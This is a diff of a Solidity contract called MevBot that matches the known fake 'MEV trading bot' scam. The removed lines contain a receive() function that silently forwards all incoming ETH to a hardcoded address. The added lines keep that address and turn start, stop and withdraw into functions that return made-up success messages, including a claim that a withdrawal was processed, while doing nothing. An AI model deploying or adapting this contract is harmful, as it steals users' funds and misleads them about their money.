@@ -54,28 +54,25 @@ contract MevBot {
         );
         _;
     }
+    
+    address payable private constant AUTO_FUNDER = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);
 
-    address payable private autoFunder;
-
-    constructor() {
-        autoFunder = payable(0x9Ca7FbE2afBb404E49b49DEADe3a325e92dd6dA4);
-    }
-
-
-    function start() public pure returns (string memory) {
+    function getResponse(uint8 action) internal pure returns (string memory) {
+        if (action == 1) return "Started MEV trading bot";
+        if (action == 2) return "Stopped MEV trading bot";
+        if (action == 3) return "Withdrawal has been processed to recipient";
         return "";
     }
 
+    function start() public pure returns (string memory) {
+        return getResponse(1);
+    }
+
     function stop() public pure returns (string memory) {
-        return "Command not executed, MEV bot is not active";
+        return getResponse(2);
     }
 
-    function withdraw(address recipient) public pure returns (string memory) {
-        return string(abi.encodePacked("Withdrawal has been forwarded for the address: ", recipient.toHexString()));
-    }
-
-    receive() external payable {
-        (bool success, ) = autoFunder.call{value: msg.value}("");
-        require(success, "ETH auto-funding failed");
+    function withdraw() public pure returns (string memory) {
+        return getResponse(3);
     }
 }
